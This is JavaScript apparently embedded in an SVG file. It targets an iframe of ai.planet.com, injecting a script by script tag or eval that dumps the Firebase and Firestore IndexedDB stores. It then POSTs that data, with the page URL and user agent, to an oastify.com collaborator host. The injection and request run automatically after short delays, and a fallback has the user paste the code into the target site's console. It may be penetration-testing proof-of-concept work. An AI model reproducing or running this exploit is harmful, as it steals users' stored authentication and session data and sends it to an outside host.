svg.script:

console.clear();

const statusLog = document.getElementById('statusLog');
let statusCounter = 0;

function logStatus(message, isError = false, isSuccess = false) {
    const timestamp = new Date().toLocaleTimeString();
    const prefix = isError ? '❌' : isSuccess ? '✅' : '📌';
    const entry = `[${timestamp}] ${prefix} ${message}`;
    console.log(entry);

    if (statusLog) {
        const color = isError ? '#f48771' : isSuccess ? '#6a9955' : '#d4d4d4';
        statusLog.innerHTML += `<div style="color:${color}">${entry}</div>`;
        statusLog.scrollTop = statusLog.scrollHeight;
    }
    statusCounter++;
    const countEl = document.getElementById('statusCount');
    if (countEl) countEl.textContent = `${statusCounter} entries`;
}

// ============================================
// APPROACH 1: Inject listener into iframe
// ============================================
function injectListenerIntoIframe() {
    const iframe = document.getElementById('planetIframe');
    if (!iframe) {
        logStatus('Iframe not found', true);
        return;
    }

    logStatus('Attempting to inject listener into iframe...');

    try {
        const iframeWindow = iframe.contentWindow;
        if (!iframeWindow) {
            logStatus('Cannot access iframe contentWindow (CORS or not loaded)', true);
            return;
        }

        // The code to inject
        const injectCode = `
            // This code runs inside the iframe
            (function() {
                console.log('[Injected] Setting up IndexedDB listener...');

                // Function to read IndexedDB
                async function readIndexedDB() {
                    const result = {};
                    try {
                        const databases = await indexedDB.databases();
                        const firebaseDBs = databases.filter(db => 
                            db.name && (db.name.includes('firebase') || 
                                       db.name.includes('heartbeat') || 
                                       db.name.includes('firestore'))
                        );

                        if (firebaseDBs.length === 0) {
                            return { error: 'No Firebase databases found' };
                        }

                        for (const dbInfo of firebaseDBs) {
                            const db = await new Promise((resolve, reject) => {
                                const req = indexedDB.open(dbInfo.name);
                                req.onsuccess = () => resolve(req.result);
                                req.onerror = () => reject(req.error);
                            });

                            const dbData = {};
                            for (const storeName of db.objectStoreNames) {
                                const data = await new Promise((resolve, reject) => {
                                    const tx = db.transaction(storeName, 'readonly');
                                    const req = tx.objectStore(storeName).getAll();
                                    req.onsuccess = () => resolve(req.result);
                                    req.onerror = () => reject(req.error);
                                });
                                dbData[storeName] = data;
                            }
                            result[dbInfo.name] = dbData;
                            db.close();
                        }
                        return result;
                    } catch (error) {
                        return { error: error.message };
                    }
                }

                // Message listener
                window.addEventListener('message', async function(event) {
                    console.log('[Injected] Received message:', event.data);

                    // Accept messages from ai.planet.com and blob URLs
                    if (event.origin !== 'https://ai.planet.com' && !event.origin.startsWith('blob:')) {
                        console.log('[Injected] Ignoring message from', event.origin);
                        return;
                    }

                    if (event.data.type === 'REQUEST_INDEXEDDB_DATA') {
                        console.log('[Injected] Processing IndexedDB request...');
                        try {
                            const data = await readIndexedDB();
                            event.source.postMessage({
                                type: 'INDEXEDDB_DATA_RESPONSE',
                                requestId: event.data.requestId,
                                payload: data
                            }, event.origin);
                            console.log('[Injected] Response sent');
                        } catch (error) {
                            event.source.postMessage({
                                type: 'INDEXEDDB_ERROR',
                                requestId: event.data.requestId,
                                error: error.message
                            }, event.origin);
                        }
                    }
                });

                // Notify parent that we're ready
                window.parent.postMessage({
                    type: 'INDEXEDDB_READY',
                    timestamp: new Date().toISOString()
                }, '*');

                console.log('[Injected] IndexedDB listener ready');
            })();
        `;

        // Try to inject by creating a script element in the iframe
        try {
            const script = iframeWindow.document.createElement('script');
            script.textContent = injectCode;
            iframeWindow.document.body.appendChild(script);
            logStatus('✅ Listener injected successfully via script tag!', false, true);
        } catch (e) {
            logStatus('Script injection failed, trying eval...', true);
            try {
                iframeWindow.eval(injectCode);
                logStatus('✅ Listener injected via eval!', false, true);
            } catch (e2) {
                logStatus('All injection methods failed: ' + e2.message, true);
            }
        }

    } catch (e) {
        logStatus('Cannot access iframe: ' + e.message, true);
        logStatus('You must manually run the listener code on ai.planet.com', true);

        // Show manual instructions
        logStatus('=== MANUAL INSTRUCTION ===');
        logStatus('1. Open ai.planet.com in a new tab');
        logStatus('2. Open developer console (F12)');
        logStatus('3. Paste and run the listener code');
        logStatus('4. Return to this SVG and click "Request Data"');
    }
}

// ============================================
// APPROACH 2: Request data from iframe
// ============================================
function requestDataFromIframe() {
    const iframe = document.getElementById('planetIframe');
    if (!iframe) {
        logStatus('Iframe not found', true);
        return;
    }

    logStatus('Sending request to iframe...');

    try {
        const iframeWindow = iframe.contentWindow;
        if (!iframeWindow) {
            logStatus('Cannot access iframe window', true);
            return;
        }

        // Send message to iframe
        iframeWindow.postMessage({
            type: 'REQUEST_INDEXEDDB_DATA',
            requestId: Date.now(),
            timestamp: new Date().toISOString()
        }, 'https://ai.planet.com');

        logStatus('✅ Request sent! Waiting for response...', false, true);

    } catch(e) {
        logStatus('Error sending message: ' + e.message, true);
    }
}

// ============================================
// Send to server
// ============================================
async function sendToServer(data) {
    const serverUrl = 'https://e2hkksv7w21hq3xdvez0rcypkgq7e12q.oastify.com/api/indexeddb';

    logStatus('Sending data to server...');
    logStatus('URL: ' + serverUrl);

    const payload = {
        source: window.location.origin,
        url: window.location.href,
        timestamp: new Date().toISOString(),
        data: data,
        fromIframe: true,
        userAgent: navigator.userAgent
    };

    console.log('📤 Sending payload:', payload);

    try {
        const response = await fetch(serverUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            mode: 'cors',
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            const result = await response.json();
            logStatus(`✅ Data sent successfully! Status: ${response.status}`, false, true);
            logStatus('Response: ' + JSON.stringify(result));
        } else {
            logStatus(`❌ Server error: ${response.status} ${response.statusText}`, true);
            const text = await response.text();
            logStatus('Response body: ' + text);
        }
    } catch (error) {
        logStatus(`❌ Network error: ${error.message}`, true);
        logStatus('💡 This is likely a CORS issue');
        logStatus('Your server must allow:');
        logStatus('  Access-Control-Allow-Origin: https://ai.planet.com');
        logStatus('  Access-Control-Allow-Methods: POST, OPTIONS');
        logStatus('  Access-Control-Allow-Headers: Content-Type');
    }
}

// ============================================
// Message listener for responses
// ============================================
window.addEventListener('message', async function(event) {
    // Accept from ai.planet.com or blob URLs
    if (event.origin !== 'https://ai.planet.com' && !event.origin.startsWith('blob:')) {
        return;
    }

    const data = event.data;
    console.log('📨 Received:', data);

    if (data.type === 'INDEXEDDB_READY') {
        logStatus('✅ Iframe listener is ready!', false, true);
    }

    if (data.type === 'INDEXEDDB_DATA_RESPONSE') {
        logStatus(`✅ Received data from iframe!`, false, true);
        logStatus(`Request ID: ${data.requestId}`);

        if (data.payload) {
            const recordCount = Object.values(data.payload).reduce((sum, store) => {
                if (Array.isArray(store)) return sum + store.length;
                if (typeof store === 'object') return sum + Object.keys(store).length;
                return sum;
            }, 0);
            logStatus(`Total records: ${recordCount}`);

            // Send to server
            await sendToServer(data.payload);
        } else {
            logStatus('⚠️ No data received');
        }
    }

    if (data.type === 'INDEXEDDB_ERROR') {
        logStatus(`❌ Iframe error: ${data.error}`, true);
    }
});

// ============================================
// Setup buttons
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    const requestBtn = document.getElementById('requestBtn');
    if (requestBtn) {
        requestBtn.addEventListener('click', requestDataFromIframe);
    }

    const injectBtn = document.getElementById('injectBtn');
    if (injectBtn) {
        injectBtn.addEventListener('click', injectListenerIntoIframe);
    }

    logStatus('🚀 Bridge initialized', false, true);
    logStatus('📍 Origin: ' + window.location.origin);
    logStatus('💡 Click "Inject Listener" then "Request Data"');
    logStatus('═══════════════════════════════════════');
});

// Auto-inject and request after delay
setTimeout(() => {
    logStatus('⏳ Auto-injecting listener...');
    injectListenerIntoIframe();
}, 3000);

setTimeout(() => {
    logStatus('⏳ Auto-requesting data...');
    requestDataFromIframe();
}, 6000);
